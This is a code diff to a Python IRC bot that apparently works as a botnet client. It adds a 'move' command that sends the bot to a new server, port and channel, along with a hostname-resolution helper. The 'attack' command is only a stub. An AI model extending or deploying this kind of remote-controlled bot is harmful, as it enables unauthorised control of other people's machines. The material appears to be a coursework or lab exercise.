@@ -5,6 +5,7 @@ import random
 import sys
 import traceback
 import time
+import re
 
 def eprint(*args, **kwargs):
     print(*args, file=sys.stderr, **kwargs)
@@ -198,19 +199,22 @@ class Bot:
                 if command == "attack":
                     pass
                 elif command == "move":
-                    if len(msgParts) == 4:
+                    eprint(msgParts)
+                    if len(msgParts) == 5:
                         server = msgParts[2]
+                        channel = msgParts[4]
                         try:
-                            port = int(msgPars[3])
+                            port = int(msgParts[3])
                             if port >= 1 and port <= 65535:
                                 #handle server name resolution
-                                
-                                self._server = socket.gethostbyname_ex(server)
+                                self._server = self.domain_resolution(server)
                                 self._port = port
-                                
+                                self._channel = '#'+channel
+                                self._socket.send("QUIT\r\n".encode("utf-8"))
                             else:
                                 eprint("Ignoring move command. Port not between 1 and 65535.")
                         except:
+                            eprint(traceback.format_exc())
                             eprint("Ignoring move command. Port malformed.")
                 elif command == "shutdown":
                     self._shutdown = True
@@ -237,6 +241,28 @@ class Bot:
 
         #change this to a new server
         self._nick = first[firstInd] + "_" + middle[middleInd] + "_" + last[lastInd]
+
+    def domain_resolution(self, host):
+        """ 
+        resolves a domain in the format xxx.xxx.xxx.xxx:xxxx[x]
+        if the specified domain is an alias, a resolution is attempted
+        """
+        ipFormat = r"(\d{1,3}\.){3}\d{1,3}$"
+        
+        # if the host does not match the ip regex
+        if not re.match(ipFormat, host):
+            (h, aliaslist, ip) = socket.gethostbyname_ex(host)
+            
+            if len(ip) > 0:
+                print("!! {0} is - aliases:{1} ips:{2}".format(host, aliaslist, ip))
+                host_ip = ip[0]
+            else:
+                eprint("Cannot resolve IP")
+        else:
+            # else host is an IP
+            host_ip = host
+        eprint("Resolved: ")    
+        return host_ip
 
 
 if __name__ == "__main__":
